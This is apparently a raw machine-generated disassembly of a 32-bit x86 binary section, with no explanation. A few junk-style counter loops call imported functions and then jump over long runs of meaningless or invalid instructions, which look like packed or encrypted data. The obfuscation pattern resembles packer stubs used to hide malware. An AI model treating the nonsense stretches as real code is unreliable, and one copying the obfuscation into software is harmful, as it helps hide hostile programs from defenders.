  4120a8:	icebp  
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	mov    edi,DWORD PTR [eax-0x62]
  412170:	in     eax,0x46
  412172:	pop    edi
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x5470707e
  41217a:	inc    ebx
  41217b:	dec    esp
  41217c:	ret    0xd6f0
  41217f:	mov    dh,0xe2
  412181:	mov    ?,WORD PTR [eax-0x3ca653a9]
  412187:	xor    dl,BYTE PTR [ebx-0x7b0c2ead]
  41218d:	xchg   edx,eax
  41218e:	stos   DWORD PTR es:[edi],eax
  41218f:	and    DWORD PTR [eax],eax
  412191:	jmp    0xeab0:0x44c4543e
  412198:	push   edi
  412199:	mov    al,ds:0xa79a81da
  41219e:	mov    edx,0x71b05813
  4121a3:	imul   cx,WORD PTR [ecx-0xb16f34c],0x6761
  4121ac:	push   cs
  4121ad:	(bad)  
  4121ae:	int    0x14
  4121b0:	mov    ecx,0xd80ce9f3
  4121b5:	(bad)  
  4121b6:	movups xmm4,xmm7
  4121b9:	and    BYTE PTR [ebx-0x74fa07ef],bl
  4121bf:	bound  eax,QWORD PTR [eax+0x3a3aa269]
  4121c5:	jg     0x412180
  4121c7:	push   0xffffffc7
  4121c9:	push   cs
  4121ca:	lods   eax,DWORD PTR ds:[esi]
  4121cb:	mov    DWORD PTR [edi-0x2644d128],ebp
  4121d1:	xor    DWORD PTR [ecx-0x3364573f],edi
  4121d7:	sub    al,0x59
  4121d9:	jp     0x412212
  4121db:	pop    ecx
  4121dc:	jo     0x41224b
  4121de:	or     ah,BYTE PTR [ecx-0x7]
  4121e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121e2:	pushf  
  4121e3:	adc    BYTE PTR [esp+edx*4-0x6871290c],0xf9
  4121eb:	test   BYTE PTR [ecx],dl
  4121ed:	ins    BYTE PTR es:[edi],dx
  4121ee:	mov    edx,0x42e48f5f
  4121f3:	xchg   DWORD PTR [ebx-0xc],edi
  4121f6:	inc    BYTE PTR [edx+0x1e]
  4121f9:	jl     0x4121e4
  4121fb:	clc    
  4121fc:	adc    cl,bl
  4121fe:	or     eax,0xf1713750
  412203:	pop    ss
  412204:	fld    TBYTE PTR [edi+0x1c]
  412207:	test   cl,dh
  412209:	outs   dx,BYTE PTR ds:[esi]
  41220a:	test   eax,0x2dd9ae56
  41220f:	data16 or al,0x5d
  412212:	pop    ss
  412213:	mov    ecx,0x43a7b03e
  412218:	pop    es
  412219:	(bad)  
  41221a:	gs push ebx
  41221c:	(bad)  [ebx+0x6b]
  41221f:	retf   0xbbf1
  412222:	ins    DWORD PTR es:[edi],dx
  412223:	push   cs
  412224:	leave  
  412225:	and    al,0x1c
  412227:	fisub  WORD PTR [esi-0x59d45422]
  41222d:	adc    BYTE PTR [edx],cl
  41222f:	sub    BYTE PTR [ecx+0x7d3169b9],bl
  412235:	inc    ebx
  412236:	mov    ebp,0xb4d796a2
  41223b:	stc    
  41223c:	mov    ecx,0xfd1414b4
  412241:	out    0xdc,eax
  412243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412244:	cli    
  412245:	sbb    al,0x92
  412247:	push   0xace55db0
  41224c:	push   ecx
  41224d:	dec    esp
  41224e:	arpl   bp,cx
  412250:	sbb    esi,DWORD PTR [edx+ebx*8+0x55bb2467]
  412257:	push   ds
  412258:	sub    dh,bh
  41225a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41225b:	and    edi,DWORD PTR [edx-0x28]
  41225e:	scas   al,BYTE PTR es:[edi]
  41225f:	and    ch,BYTE PTR [ecx-0x42]
  412262:	(bad)  
  412263:	mov    al,0xca
  412265:	mov    ds:0xe0505bcd,eax
  41226a:	ja     0x412252
  41226c:	jns    0x4122ed
  41226e:	sbb    al,0xd7
  412270:	xor    al,bh
  412272:	aam    0x9d
  412274:	mov    edx,DWORD PTR [ecx-0x2499f7f6]
  41227a:	add    edx,DWORD PTR [edx+0x5b]
  41227d:	mov    ebp,edx
  41227f:	dec    edx
  412280:	pop    eax
  412281:	xchg   ebx,eax
  412282:	rcl    DWORD PTR [edi+0x3776f653],cl
  412288:	mov    eax,ds:0x5dcc994c
  41228d:	in     al,0x13
  41228f:	xchg   BYTE PTR [ebx],ch
  412291:	and    ah,BYTE PTR [esi]
  412293:	or     ecx,DWORD PTR [ebx+0x57cd166c]
  412299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41229a:	or     ebx,DWORD PTR [edx+eiz*1-0x3e]
  41229e:	push   0xf1a61808
  4122a3:	add    esi,DWORD PTR [esi-0x1]
  4122a6:	inc    edx
  4122a7:	jecxz  0x4122f0
  4122a9:	sar    BYTE PTR [ecx],1
  4122ab:	dec    ebp
  4122ac:	nop
  4122ad:	xchg   ebp,eax
  4122ae:	dec    edx
  4122af:	dec    eax
  4122b0:	mov    al,0xf3
  4122b2:	or     DWORD PTR [esi],0xffffffea
  4122b5:	mov    esp,0x513aa58c
  4122ba:	jae    0x412293
  4122bc:	inc    esi
  4122bd:	inc    edi
  4122be:	stc    
  4122bf:	push   0x979cb702
  4122c4:	mov    esp,0x384ea2e5
  4122c9:	neg    DWORD PTR [ebx+0x40dfc5e3]
  4122cf:	mov    bh,0x78
  4122d1:	mov    edi,DWORD PTR [ebx-0x1c]
  4122d4:	mov    dl,0xd1
  4122d6:	dec    esp
  4122d7:	fnsave [ebp-0x2f]
  4122da:	inc    ebx
  4122db:	popf   
  4122dc:	mov    BYTE PTR [esi],dl
  4122de:	push   esi
  4122df:	jp     0x41227f
  4122e1:	call   0x9252:0xb5cdcc9c
  4122e8:	repz push ebx
  4122ea:	sub    ch,dh
  4122ec:	push   ds
  4122ed:	mov    esi,0xc280e118
  4122f2:	mov    esp,0xc638cd8f
  4122f7:	mov    bl,0xe
  4122f9:	add    ebp,DWORD PTR [ebp-0x3dc89937]
  4122ff:	xchg   ecx,eax
  412300:	hlt    
  412301:	push   ebp
  412302:	inc    edi
  412303:	jb     0x412358
  412305:	mov    al,ds:0x2d04fdc5
  41230a:	test   al,0xcb
  41230c:	fidiv  DWORD PTR [ebp+0x6e]
  41230f:	test   eax,0xb1913c89
  412314:	mov    edi,0xed363b3e
  412319:	push   ss
  41231a:	outs   dx,BYTE PTR ds:[esi]
  41231b:	nop
  41231c:	pop    es
  41231d:	pop    ebx
  41231e:	bound  esp,QWORD PTR [ebp+0x60]
  412321:	lods   eax,DWORD PTR ds:[esi]
  412322:	les    eax,FWORD PTR [edi+0x35b3f405]
  412328:	push   cs
  412329:	or     al,0xa
  41232b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41232c:	cli    
  41232d:	mov    gs,WORD PTR [edi+0x71]
  412330:	jge    0x4122c9
  412332:	push   ecx
  412333:	cld    
  412334:	aam    0xf6
  412336:	sbb    DWORD PTR [ebx+0x19],edx
  412339:	(bad)  
  41233a:	fdivr  DWORD PTR ds:0x9a78598d
  412340:	ret    
  412341:	add    cl,BYTE PTR [eax]
  412343:	repnz and DWORD PTR [ecx+0x7c4fc89b],esp
  41234a:	aad    0x40
  41234c:	and    esp,DWORD PTR [ebx-0x71]
  41234f:	push   ecx
  412350:	cdq    
  412351:	or     al,0x90
  412354:	mov    al,0x75
  412356:	push   ss
  412357:	and    esp,DWORD PTR [ebx+0x5d726c12]
  41235d:	int    0xbf
  41235f:	jno    0x412377
  412361:	cmp    DWORD PTR [esp+eax*1-0x2b],0xfa9ea25f
  412369:	lahf   
  41236a:	ss ja  0x412313
  41236d:	stc    
  41236e:	retf   
  41236f:	jmp    0x46b0151
  412374:	ror    BYTE PTR [eax],0x21
  412377:	xor    DWORD PTR [edx+0x37],eax
  41237a:	xor    cl,ch
  41237c:	inc    edx
  41237d:	and    eax,edx
  41237f:	and    edx,esp
  412381:	mov    cl,0x92
  412383:	pop    ebp
  412384:	cdq    
  412385:	stos   DWORD PTR es:[edi],eax
  412386:	cmp    al,BYTE PTR [ecx+0x62254b71]
  41238c:	leave  
  41238d:	xor    bh,BYTE PTR [edx+0x19a30158]
  412393:	test   eax,esp
  412395:	xchg   ebx,eax
  412396:	dec    esp
  412397:	mov    ebx,0xb1793570
  41239c:	scas   al,BYTE PTR es:[edi]
  41239d:	mov    ecx,0xc67b0a44
  4123a2:	out    0x99,al
  4123a4:	imul   edi,DWORD PTR [ebx-0x25662f0d],0xffffffcf
  4123ab:	std    
  4123ac:	mov    dl,0x55
  4123ae:	jnp    0x412370
  4123b0:	pop    DWORD PTR [ecx+0x6c2670a6]
  4123b6:	stc    
  4123b7:	in     eax,0xa1
  4123b9:	popf   
  4123ba:	xchg   ecx,eax
  4123bb:	and    cl,BYTE PTR [ebx+0x1b]
  4123be:	jg     0x412349
  4123c0:	pop    ebx
  4123c1:	adc    eax,DWORD PTR [ebx+esi*8-0x3a]
  4123c5:	sti    
  4123c6:	pop    esp
  4123c7:	mov    ah,0x8a
  4123c9:	(bad)  
  4123ca:	call   0x5127:0xf020f277
  4123d1:	or     al,0xd1
  4123d3:	mov    DWORD PTR [esi-0x2744bb21],edx
  4123d9:	or     DWORD PTR cs:[ebp+ecx*2+0x233adda5],esp
  4123e1:	push   0xffffffd9
  4123e3:	in     eax,dx
  4123e4:	xor    BYTE PTR [ebx+0x1d8b1e3f],0xfa
  4123eb:	iret   
  4123ec:	ret    
  4123ed:	jbe    0x4123bf
  4123ef:	call   0x22f9:0x1806548c
  4123f6:	(bad)  
  4123f7:	fnsave [eax+0x41]
  4123fa:	adc    eax,0x81a4a741
  4123ff:	vroundss xmm5,xmm7,DWORD PTR [ebx-0x3be3e1b7],0x3d
  412409:	bnd jge 0x412484
  41240c:	ja     0x412442
  41240e:	loop   0x412425
  412410:	in     eax,dx
  412411:	add    al,0x3f
  412413:	sti    
  412414:	pop    ecx
  412415:	cmp    eax,DWORD PTR [ebx+eax*8-0x20]
  412419:	mov    dl,0x3b
  41241b:	pushf  
  41241c:	dec    eax
  41241d:	aad    0x4c
  41241f:	out    dx,eax
  412420:	adc    DWORD PTR [esi-0x2cf87ec3],esp
  412426:	xor    bh,dh
  412428:	repnz push edi
  41242a:	call   0xbafa:0xd74a37ec
  412431:	dec    esp
  412432:	scas   eax,DWORD PTR es:[edi]
  412433:	ss mov edi,0xd264368a
  412439:	and    DWORD PTR [edx+edi*2],ebp
  41243c:	sub    al,0xda
  41243e:	and    eax,0x81cb0378
  412443:	sub    eax,0x42fcf9
  412448:	xchg   esi,eax
  412449:	sldt   WORD PTR [eax]
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	sti    
  41245e:	add    eax,0x5c8f8168
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xac70707e
  41246a:	and    edx,edx
  41246c:	jmp    0x2dd1f4c6
  412471:	ins    BYTE PTR es:[edi],dx
  412472:	fsubr  DWORD PTR [esi]
  412474:	mov    cl,0xfd
  412476:	clc    
  412477:	call   0x8d27a576
  41247c:	ret    0x6215
  41247f:	dec    ecx
  412480:	jns    0x4124d8
  412482:	xchg   edx,eax
  412483:	fnstenv [edx-0x7d]
  412486:	test   DWORD PTR [edx+0x2cee9ba0],0xd5c6d55a
  412490:	jge    0x412423
  412492:	sbb    ebx,DWORD PTR [edx]
  412494:	adc    al,0xab
  412496:	jg     0x412443
  412498:	add    al,0xe0
  41249a:	push   ss
  41249b:	add    eax,0xc8429781
  4124a0:	adc    bh,BYTE PTR [eax+0x1e85fa13]
  4124a6:	mov    esi,0xd85dc1dc
  4124ab:	or     eax,edx
  4124ad:	dec    esp
  4124ae:	(bad)  
  4124b0:	imul   esi,DWORD PTR [ebp+0x3d47cf0e],0x1ae73dfc
  4124ba:	call   FWORD PTR [eax-0x3319c349]
  4124c0:	push   esp
  4124c1:	jb     0x412488
  4124c3:	shl    ch,1
  4124c5:	ds jmp 0xc88ccff7
  4124cb:	xchg   edx,eax
  4124cc:	pushf  
  4124cd:	dec    esi
  4124ce:	inc    ebx
  4124cf:	dec    edx
  4124d0:	jmp    0x259e:0xe90a474c
  4124d7:	jb     0x41247c
  4124d9:	jno    0x412554
  4124db:	sub    al,0xf7
  4124dd:	xchg   esp,eax
  4124de:	add    DWORD PTR [ecx],ebp
  4124e0:	push   edx
  4124e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124e2:	enter  0xfe0f,0xe6
  4124e6:	add    DWORD PTR ss:[ecx+ecx*8-0x61a5a68],esi
  4124ee:	sub    edi,DWORD PTR [ecx-0x4f67f323]
  4124f4:	out    dx,al
  4124f5:	loope  0x412483
  4124f7:	mov    ch,0xc4
  4124f9:	and    BYTE PTR [edi],bl
  4124fb:	add    dh,dl
  4124fd:	repz fcom QWORD PTR [ecx-0x6ad77fd8]
  412504:	sbb    eax,0xd3651d53
  412509:	inc    edx
  41250a:	xlat   BYTE PTR ds:[ebx]
  41250b:	cmp    ah,ah
  41250d:	iret   
  41250e:	(bad)  
  412510:	shl    DWORD PTR [ebp+edi*8-0x75],0x40
  412515:	stos   BYTE PTR es:[edi],al
  412516:	add    DWORD PTR [edx+0x17],edi
  412519:	mov    edi,0x4506b938
  41251e:	sbb    al,0x2c
  412520:	and    DWORD PTR [edi],0xffffff8a
  412523:	jl     0x412511
  412525:	int    0xbc
  412527:	mov    esp,0xfaf50dc5
  41252c:	stos   BYTE PTR es:[edi],al
  41252d:	sub    BYTE PTR [esi-0x41209c31],bh
  412533:	mov    dh,0xd7
  412535:	push   esp
  412536:	sbb    edi,DWORD PTR [ecx-0x2a]
  412539:	(bad)  
  41253a:	repz (bad) 
  41253c:	dec    esi
  41253d:	(bad)  
  41253f:	jnp    0x41259e
  412541:	popa   
  412542:	or     BYTE PTR [ecx],0x77
  412545:	xchg   ebx,eax
  412546:	pop    eax
  412547:	mov    dh,0xb2
  412549:	pop    ss
  41254a:	inc    edi
  41254b:	shl    DWORD PTR [eax+0x3e],cl
  41254e:	xor    al,BYTE PTR [edx]
  412550:	out    dx,eax
  412551:	jg     0x41254c
  412553:	in     eax,0x7
  412555:	add    DWORD PTR [esp+ebx*2-0x64],eax
  412559:	ins    BYTE PTR es:[edi],dx
  41255a:	std    
  41255b:	mov    DWORD PTR [ecx+0x6e],esi
  41255e:	push   DWORD PTR [edx-0x68]
  412561:	scas   eax,DWORD PTR es:[edi]
  412562:	and    DWORD PTR [ecx],esp
  412564:	(bad)  
  412566:	mov    bl,BYTE PTR [ebp-0x75]
  412569:	or     al,bh
  41256b:	push   eax
  41256c:	in     eax,dx
  41256d:	mov    esp,0x1e413ed4
  412572:	inc    edx
  412573:	mov    ch,0x55
  412575:	pop    ds
  412576:	mov    ah,0x1a
  412578:	mov    ah,0x9f
  41257a:	cld    
  41257b:	cmp    DWORD PTR [edi],0x26
  41257e:	(bad)  
  41257f:	fcmove st,st(4)
  412581:	ins    DWORD PTR es:[edi],dx
  412582:	sti    
  412583:	xchg   esi,eax
  412584:	sbb    bl,cl
  412586:	aas    
  412587:	in     al,0x1a
  412589:	mov    esp,0x68e4d0f2
  41258e:	pop    ds
  41258f:	jb     0x412592
  412591:	or     eax,0x31baebdf
  412596:	xsaves [ebx+0x1a]
  41259a:	pusha  
  41259b:	dec    esi
  41259c:	mov    al,0x73
  41259e:	imul   esi,DWORD PTR [edi+0x7fb58ed1],0xffffffd9
  4125a5:	test   bh,0x2b
  4125a8:	inc    esp
  4125a9:	ins    BYTE PTR es:[edi],dx
  4125aa:	aas    
  4125ab:	jp     0x4125ea
  4125ad:	and    BYTE PTR [edi],0xf
  4125b0:	and    DWORD PTR [esi+0x9be7888],ecx
  4125b6:	jbe    0x412550
  4125b8:	push   eax
  4125b9:	lea    eax,[ebx+0x44841f60]
  4125bf:	mov    edi,0xc6861e
  4125c4:	jl     0x41254b
  4125c6:	adc    BYTE PTR [ebx-0x17],dl
  4125c9:	arpl   WORD PTR [edi+esi*1+0x75],si
  4125cd:	fwait
  4125ce:	test   al,0x2a
  4125d0:	arpl   WORD PTR [ecx+0x5e],sp
  4125d3:	(bad)  
  4125d5:	pop    ecx
  4125d6:	das    
  4125d7:	lea    edi,[esi-0x64e23c24]
  4125dd:	jae    0x4125f5
  4125df:	add    esi,DWORD PTR [ebp+0x13]
  4125e2:	jmp    DWORD PTR [edx-0x2b429be3]
  4125e8:	adc    al,0xd5
  4125ea:	retf   
  4125eb:	enter  0xc0c8,0x4d
  4125ef:	mov    ebx,0xa4b73310
  4125f4:	fs cwde 
  4125f6:	out    0x76,eax
  4125f8:	bound  ebp,QWORD PTR [ecx-0x2dee0dda]
  4125fe:	pop    ss
  4125ff:	mov    eax,0x7e8e1e8d
  412604:	mov    edi,0x5677774
  412609:	push   eax
  41260a:	rcl    BYTE PTR [ebx-0x3f],cl
  41260d:	and    BYTE PTR [eax],bl
  41260f:	sar    DWORD PTR [eax],cl
  412611:	test   BYTE PTR [esi-0x16],0x1b
  412615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412616:	push   edx
  412617:	pushf  
  412618:	mov    cl,0x7a
  41261a:	(bad)  
  41261b:	xor    al,0x85
  41261d:	pusha  
  41261e:	int    0xf6
  412620:	mov    esi,0x576a2618
  412625:	mov    ebp,DWORD PTR [edi-0x4da92249]
  41262b:	shl    ebx,0xd3
  41262e:	iret   
  41262f:	iret   
  412630:	cmp    al,0xb
  412632:	jae    0x412690
  412634:	and    BYTE PTR [ebp+0x4a],dl
  412637:	cmp    DWORD PTR [ebx-0x5cd6d169],eax
  41263d:	mov    WORD PTR [esi-0x69],?
  412640:	push   ebp
  412641:	pop    ebx
  412642:	sub    DWORD PTR [edx+ecx*4-0x73e7e832],ecx
  412649:	lods   eax,DWORD PTR ds:[esi]
  41264a:	fcmovnu st,st(5)
  41264c:	jbe    0x4125d2
  41264e:	xchg   esi,eax
  41264f:	jae    0x4125ea
  412651:	jae    0x41269b
  412653:	or     ecx,DWORD PTR [eax+0x18]
  412656:	xchg   ebx,eax
  412657:	xchg   edi,eax
  412658:	or     ebx,DWORD PTR [esi+0x1ec3fe5]
  41265e:	pop    ebp
  41265f:	out    dx,al
  412660:	int3   
  412661:	or     BYTE PTR [ebp-0x2a],al
  412664:	imul   edi,DWORD PTR [ecx-0x10],0x95a244a5
  41266b:	(bad)  
  41266c:	cli    
  41266d:	add    edx,ebx
  41266f:	add    eax,0x5ceabdc6
  412674:	arpl   WORD PTR [esi],bp
  412676:	add    eax,0xbde1977c
  41267b:	xchg   edx,eax
  41267c:	pop    edx
  41267d:	dec    esi
  41267e:	test   DWORD PTR [edx-0x6d],ebx
  412681:	push   ds
  412682:	stos   BYTE PTR es:[edi],al
  412683:	mov    ebx,0x332d4600
  412688:	stc    
  412689:	imul   ebp,DWORD PTR ds:0x784ec4a7,0x3
  412690:	jnp    0x41268a
  412692:	ror    ebp,1
  412694:	rcl    BYTE PTR [edx+esi*4-0x66],cl
  412698:	mov    al,ds:0xef697788
  41269d:	pop    eax
  41269e:	or     eax,0x83ceab5d
  4126a3:	cmp    al,0x73
  4126a5:	push   ebp
  4126a6:	cmp    DWORD PTR [ecx],ecx
  4126a8:	ret    
  4126a9:	dec    eax
  4126aa:	jo     0x41270c
  4126ac:	mov    cl,0xaf
  4126ae:	inc    eax
  4126af:	aas    
  4126b0:	inc    edx
  4126b1:	pop    ebx
  4126b2:	or     al,0x90
  4126b4:	lods   al,BYTE PTR ds:[esi]
  4126b5:	int3   
  4126b6:	mov    esi,0xa60b8f26
  4126bb:	mov    DWORD PTR [edi+0x16f6e18],edi
  4126c1:	mov    esi,0x18a3efb2
  4126c6:	mov    ds:0x24182903,eax
  4126cb:	cmp    DWORD PTR [ecx+0x37],esp
  4126ce:	scas   eax,DWORD PTR es:[edi]
  4126cf:	outs   dx,DWORD PTR ds:[esi]
  4126d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d1:	push   eax
  4126d2:	add    ecx,DWORD PTR [eax-0x136afc4e]
  4126d8:	pop    esi
  4126d9:	cmp    al,0x61
  4126db:	add    BYTE PTR [edi-0x57],bl
  4126de:	inc    edx
  4126df:	add    ebx,esp
  4126e1:	sti    
  4126e2:	xchg   ebp,eax
  4126e3:	pop    ebx
  4126e4:	(bad)  
  4126e5:	pop    ebp
  4126e6:	inc    edi
  4126e7:	stc    
  4126e8:	jl     0x412751
  4126ea:	out    0x76,eax
  4126ec:	loop   0x412751
  4126ee:	xchg   esi,eax
  4126ef:	xor    DWORD PTR [esi-0x3e],ecx
  4126f2:	aam    0x17
  4126f4:	cwde   
  4126f5:	hlt    
  4126f6:	xor    BYTE PTR [ecx+0xb45e815],bh
  4126fc:	dec    ebp
  4126fd:	ins    DWORD PTR es:[edi],dx
  4126fe:	ror    BYTE PTR [edx+esi*4+0x27856fbf],cl
  412705:	jecxz  0x4126f1
  412707:	pushf  
  412708:	ror    BYTE PTR [esi-0x2c],cl
  41270b:	inc    esp
  41270c:	scas   al,BYTE PTR es:[edi]
  41270d:	mov    eax,0x9e50621b
  412712:	in     al,0x0
  412714:	adc    DWORD PTR [edi-0x7],0xffffffc1
  412718:	jo     0x4126d9
  41271a:	adc    BYTE PTR [ebx-0x3b4fd5a0],bh
  412720:	push   cs
  412721:	sbb    eax,0x7cf8e93
  412726:	push   ebp
  412727:	mov    ds:0x7c671a96,eax
  41272c:	xchg   esi,eax
  41272d:	xor    al,0xa6
  41272f:	jle    0x4126ba
  412731:	dec    ebp
  412732:	in     al,0x81
  412734:	and    eax,0x42fd76
  412739:	add    BYTE PTR [eax],al
  41273b:	add    BYTE PTR [eax],al
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fd76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fd76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fd6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ecx,ecx
  4127be:	mov    dh,0x78
  4127c0:	(bad)  
  4127c1:	enter  0x7059,0x70
  4127c5:	mov    ecx,0x7070707e
  4127ca:	push   eax
  4127cb:	ins    DWORD PTR es:[edi],dx
  4127cc:	and    eax,edi
  4127ce:	sub    esi,0xff580f18
  4127d4:	lods   al,BYTE PTR ds:[esi]
  4127d5:	pop    ecx
  4127d6:	cdq    
  4127d7:	fst    QWORD PTR [ebp+0x12ca0448]
  4127dd:	scas   eax,DWORD PTR es:[edi]
  4127de:	les    esp,FWORD PTR [ecx]
  4127e0:	lahf   
  4127e1:	in     eax,dx
  4127e2:	repz jl 0x4127d8
  4127e5:	test   al,0xed
  4127e7:	xchg   ebx,eax
  4127e8:	push   esi
  4127e9:	lahf   
  4127ea:	test   DWORD PTR [ecx-0x196b63ab],edx
  4127f0:	neg    DWORD PTR [edx]
  4127f2:	cmp    eax,0x6ab0eed2
  4127f7:	dec    esp
  4127f8:	cmp    al,0x56
  4127fa:	cld    
  4127fb:	fstp   TBYTE PTR [edi]
  4127fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127fe:	fisttp QWORD PTR [edx-0x685ca31e]
  412804:	xchg   ecx,eax
  412805:	gs push cs
  412807:	dec    esi
  412808:	jae    0x412804
  41280a:	loope  0x41281f
  41280c:	xchg   esp,eax
  41280d:	or     DWORD PTR es:[eax+ebp*2],ebx
  412811:	imul   esi,edx,0xe23dabea
  412817:	or     BYTE PTR [ecx],0x59
  41281a:	sar    DWORD PTR [edx-0x5c],0x99
  41281e:	scas   eax,DWORD PTR es:[edi]
  41281f:	jle    0x41280f
  412821:	sbb    dl,cl
  412823:	dec    ebp
  412824:	fcmovne st,st(0)
  412826:	pop    ecx
  412827:	das    
  412828:	lods   al,BYTE PTR ds:[esi]
  412829:	fsubr  QWORD PTR ds:0xed4f4fa7
  41282f:	dec    edx
  412830:	test   BYTE PTR [ebx],0x5a
  412833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412834:	fisubr DWORD PTR [edx-0x5a427945]
  41283a:	jo     0x412880
  41283c:	mov    al,0x99
  41283e:	not    BYTE PTR [esi]
  412840:	inc    ebx
  412841:	adc    ch,BYTE PTR [edi-0xdc04e5b]
  412847:	mov    WORD PTR ds:0x39f23a10,fs
  41284d:	add    ebx,eax
  41284f:	rol    al,0xcd
  412852:	push   ebp
  412853:	xlat   BYTE PTR ds:[ebx]
  412854:	clc    
  412855:	retf   
  412856:	sub    eax,0xffffff86
  412859:	fcmovnbe st,st(5)
  41285b:	push   eax
  41285c:	fcom   QWORD PTR [edi+ebp*4+0x65]
  412860:	cdq    
  412861:	jle    0x4127f2
  412863:	ss jnp 0x412814
  412866:	je     0x4127ef
  412868:	inc    esp
  412869:	mov    al,0x52
  41286b:	in     eax,dx
  41286c:	cmp    al,0x4a
  41286e:	test   eax,0xa389542a
  412873:	int3   
  412874:	xchg   ah,bh
  412876:	in     eax,0x29
  412878:	adc    al,0xec
  41287a:	leave  
  41287b:	cmp    BYTE PTR [ecx-0x51809437],bh
  412881:	repz mov edx,0x1cf7a591
  412887:	xor    al,0xd4
  412889:	sbb    ecx,DWORD PTR [edi-0x367c4c46]
  41288f:	inc    esp
  412890:	inc    esi
  412891:	mov    al,0x79
  412893:	push   ebp
  412894:	jnp    0x412899
  412896:	fsub   st,st(4)
  412898:	ins    DWORD PTR es:[edi],dx
  412899:	xchg   ebp,eax
  41289a:	add    ebp,ebx
  41289c:	rcl    DWORD PTR [eax-0x1693ba42],0xd7
  4128a3:	xor    al,0xcf
  4128a5:	popf   
  4128a6:	fdiv   st(1),st
  4128a8:	push   esi
  4128a9:	and    dh,BYTE PTR [ebx-0x7e0f9997]
  4128af:	fisubr WORD PTR [eax-0x4bc43930]
  4128b5:	aam    0xc1
  4128b7:	add    ch,BYTE PTR [edi-0x3b759e48]
  4128bd:	cmp    eax,0x6d3b717
  4128c2:	rcr    BYTE PTR [ebx-0x1],0xe3
  4128c6:	push   ecx
  4128c7:	pop    eax
  4128c8:	clc    
  4128c9:	test   eax,0x3ed8cabe
  4128ce:	int3   
  4128cf:	jl     0x4128f6
  4128d1:	mov    eax,0x7f864dc4
  4128d6:	pop    edi
  4128d7:	out    dx,al
  4128d8:	fwait
  4128d9:	inc    edi
  4128da:	lods   al,BYTE PTR ds:[esi]
  4128db:	jbe    0x41287c
  4128dd:	push   edx
  4128de:	mov    esp,0x8ec7f3cf
  4128e3:	cmc    
  4128e4:	or     al,0x3e
  4128e6:	(bad)  
  4128e7:	in     al,dx
  4128e8:	mov    ebx,0x90d0f45e
  4128ed:	clc    
  4128ee:	cmp    ebp,DWORD PTR [esi+0x549efc42]
  4128f4:	rcr    BYTE PTR [eax],0xbb
  4128f7:	rol    BYTE PTR [esi+0x4823685a],0x3c
  4128fe:	sub    al,0xf2
  412900:	jnp    0x41292d
  412902:	out    0x14,eax
  412904:	jnp    0x412915
  412906:	das    
  412907:	dec    eax
  412908:	out    dx,al
  412909:	and    al,0x1c
